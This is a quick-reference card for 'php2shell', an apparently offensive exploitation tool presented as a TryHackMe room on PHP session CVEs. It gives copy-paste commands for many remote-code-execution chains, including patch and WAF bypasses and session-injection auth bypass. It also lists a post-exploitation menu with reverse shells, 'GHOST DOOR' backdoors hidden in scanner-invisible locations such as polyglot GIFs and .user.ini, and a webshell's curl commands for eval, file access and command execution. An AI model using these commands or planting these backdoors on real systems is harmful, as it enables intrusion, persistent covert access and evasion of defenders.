# php2shell TryHackMe Quick Reference Card

## Room: php2shell (CVE-2026-109618/109619)

### Target Ports
| Service | Version | Port | Chains |
|---------|---------|------|--------|
| PHP-FPM (nginx) | 8.2.34 | 18082 | A, C, E, **F, G, H** |
| PHP-FPM (nginx) | 8.3.35 | 18083 | A, C, E, **F, G, H** |
| PHP-FPM (nginx) | 8.4.26 | 18084 | A, C, E, **F, G, H** |
| PHP-FPM (nginx) | 8.2.35 | 18085 | **PATCHED** (D blocked, F/G/H still viable) |
| Apache mod_php | 8.2.34 | 18091 | A, D, **F, G, H** |
| Apache mod_php | 5.6.40 | 18092 | A, D, **F, H** |
| Apache mod_php | 7.4.33 | 18093 | A, D, **F, H** |

### Key Endpoints
| Path | Description | Used By |
|------|-------------|---------|
| `/index.php` | Default, `session_start()` | All (recon) |
| `/vuln.php` | LFI: `include($_GET['page'])` | **Chain A** |
| `/nosession.php` | No `session_start()` | **Chain C** (upload), **Chain E** (consumer) |
| `/app_serialize.php` | Sets `php_serialize` handler | **Chain C** (pollute) |
| `/destruct_test.php` | Defines `Evil` class + `session_start()` | **Chain C/F** (trigger) |
| `/session_oom.php` | `session_start()` for large sessions | **Chain E** (producer) |
| `/fatal.php` | Allocates 64MB (OOM trigger) | **Chain D, E, H** |

### Session Path
```
/tmp/sessions/sess_<SID>
```

---

## 🚀 Quick Commands (Copy-Paste Ready)

### 1. Recon Only
```bash
python3 php2shell.py --target http://MACHINE_IP:18091 --recon-only
```

### 2. Full Auto (All 8 Chains, First Success Wins)
```bash
python3 php2shell.py --target http://MACHINE_IP:18091 --auto
```

### 3. BLITZ Mode (Parallel, Fastest)
```bash
python3 php2shell.py --target http://MACHINE_IP:18091 --blitz
```

### 4. Chain A — Session + LFI (mod_php ports)
```bash
python3 php2shell.py --target http://MACHINE_IP:18091 --universal
# OR manually:
python3 php2shell.py --target http://MACHINE_IP:18091 --chain-a \
  --lfi-path /vuln.php --session-path /tmp/sessions
```

### 5. Chain F — Key Smuggling (Zero-LFI, FPM ports)
```bash
python3 php2shell.py --target http://MACHINE_IP:18082 --chain-f
# No LFI needed! Works on any serialize_handler=php target
```

### 6. Chain H — ZMM Grooming (ALL ports)
```bash
python3 php2shell.py --target http://MACHINE_IP:18091 --chain-h
# Bypasses OOM patch — works on patched versions too!
```

### 7. Chain D — OOM (mod_php only)
```bash
python3 php2shell.py --target http://MACHINE_IP:18091 --chain-d \
  --strategy headers --num-headers 8000 --header-size 1000 --oracle
```

### 8. Session Variable Injection (Auth Bypass)
```bash
python3 php2shell.py --target http://MACHINE_IP:18082 --sess-inject "isAdmin|b:1;"
```

### 9. Research Framework (Zero-Day Hunting)
```bash
python3 php2shell.py --target http://MACHINE_IP:18091 --research
```

---

## ✅ Success Indicators

| Chain | Success Output |
|-------|----------------|
| A | `RCE CONFIRMED — CHAIN A SUCCESSFUL!` + `uid=33(www-data)` |
| B | `CHAIN B SUCCESS! Output: uid=...` |
| C | `RCE CONFIRMED — CHAIN C SUCCESSFUL!` |
| D | `[!!!] Server returned 500 — OOM triggered!` |
| E | `CHAIN E SUCCESS via LFI proof!` |
| F | `TIMING ORACLE HIT: 4.2s vs baseline 0.1s` |
| G | `OPcache persistence established: /var/www/html/cache/...` |
| H | `ZMM bin XXX corruption attempted` |

---

## 🎯 Post-Exploitation Menu (After RCE)

```
[1] Shell         — interactive command loop
[2] Upload file   — local file → target
[3] Download file — target file → local
[4] Webshell      — persistent shell in webroot
[5] Reverse shell — connect back to your listener
[6] Enumerate     — quick system recon
[7] OPcache Persist — Chain G for persistent RCE
[8] Research Framework — zero-day hunting
[0] Exit
```

---

## ⚠️ Troubleshooting

| Issue | Fix |
|-------|-----|
| `No LFI sink found` | Try different port (18091 has /vuln.php) |
| `serialize_handler != php` | Chain F won't work — check recon |
| `Chain D failed` | PHP version patched (8.2.35+) — use Chain H instead |
| `Connection timeout` | VPN disconnected or wrong port |
| `403 Forbidden` | Use `--evasive --drip` flags |
| `No writable PHP file` | Chain G needs post-exploit file write |
| `No detonation` | Chain F: increase `--attempts`, try custom `--gadget` |

---

## 🧠 Chain Comparison

| Feature | A | B | C | D | E | F | G | H |
|---------|---|---|---|---|---|---|---|---|
| Needs LFI | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| Needs session | ✅ | ❌ | ✅ | ❌ | ✅ | ✅ | ❌ | ❌ |
| Pre-auth | ✅ | ❌ | ✅ | ✅ | ✅ | ✅ | ✅* | ✅ |
| Works on patched | ❌ | ✅ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ |
| Zero preconditions | ❌ | ❌ | ❌ | ✅ | ❌ | ❌ | ❌ | ✅ |
| Persistence | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ❌ |

*Chain G needs prior RCE for file write

---

## � One-Liner Cheatsheet

```bash
# Fastest test:
python3 php2shell.py -t http://MACHINE_IP:18091 --blitz

# Zero-LFI test:
python3 php2shell.py -t http://MACHINE_IP:18082 --chain-f

# Patched version bypass:
python3 php2shell.py -t http://MACHINE_IP:18085 --chain-h

# Full assault:
python3 php2shell.py -t http://MACHINE_IP:18091 --auto

# Research:
python3 php2shell.py -t http://MACHINE_IP:18091 --research
```

---

## 🆕 New Chains (v2 — 21 total)

| Chain | Command | Needs | Notes |
|-------|---------|-------|-------|
| **US** | `--chain-us` | Open registration + unserialize | **NO LFI!** Most critical |
| **GP** | `--chain-gp` | GET param → session + LFI | WAF checks POST only |
| **WB** | `--chain-wb` | LFI endpoint | basename() WAF blind |
| **SPL** | `--chain-spl` | post-shell | SPL iterator → FS enum |
| **PHAR** | `--chain-phar` | File-function param | **UNIVERSAL** — every app has file functions |
| **PIR** | `--chain-pir` | phpinfo() + include | tmp_name race |
| **COM** | `--chain-com` | Windows COM ext | Class not function — disable_functions bypass |
| **FFI** | `--chain-ffi` | ffi.enable=1 | Direct C call |
| **PI** | `--chain-pi` | phpinfo() exposed | Exploit intel |

## 👻 GHOST DOOR Persistence

Auto-planted after any RCE — 9 primitives in scanner-invisible locations:

| Door | Location | Evasion |
|------|----------|---------|
| Template-cache | `uploads/.tpl_*.php` | Looks like generated cache |
| .user.ini | `uploads/.user.ini` | Hidden dotfile, auto_prepend |
| Resurrection | `C:/tmp/.g_*.dat` | **Outside webroot** |
| Polyglot | `uploads/g_*.gif` | GIF89a + PHP |
| Composer | `autoload_files.php` | Every-request injection |

Ghost door eval: `curl "http://target/uploads/.tpl_*.php?g=BASE64_EVAL"`

## 🐚 Advanced Uploader Shell (`us_shell.php`)

15 params — eval (undisableable), file ops w/ COM FSO bypass, 11-method exec, chunked upload, fsockopen fetch, self-update:

```bash
curl "target/us_shell.php?c=BASE64"     # eval (can't be disabled)
curl "target/us_shell.php?r=file"       # read (4-method fallback)
curl "target/us_shell.php?w=f&d=data"   # write (4-method fallback)
curl "target/us_shell.php?exec=cmd"     # exec (11 methods: COM/FFI/imap/pcntl)
curl "target/us_shell.php?u=url&to=f"   # server-side fetch (fsockopen fallback)
curl "target/us_shell.php?stat=1"       # full recon
curl "target/us_shell.php?self=" -d @new.php  # self-update
```
